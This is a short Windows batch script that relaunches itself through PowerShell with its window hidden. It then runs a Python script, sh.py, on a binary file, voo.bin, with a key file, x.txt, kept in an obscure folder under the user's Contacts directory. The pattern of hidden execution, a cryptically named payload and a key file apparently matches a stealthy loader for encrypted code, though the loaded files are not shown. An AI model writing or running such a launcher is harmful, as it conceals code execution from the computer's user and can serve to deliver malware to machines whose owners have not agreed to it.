@echo off
if not "%~1"=="h" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
    exit /b
)
set "target=%USERPROFILE%\Contacts\zo"

cd /d "%target%"
python.exe sh.py -i voo.bin -k x.txt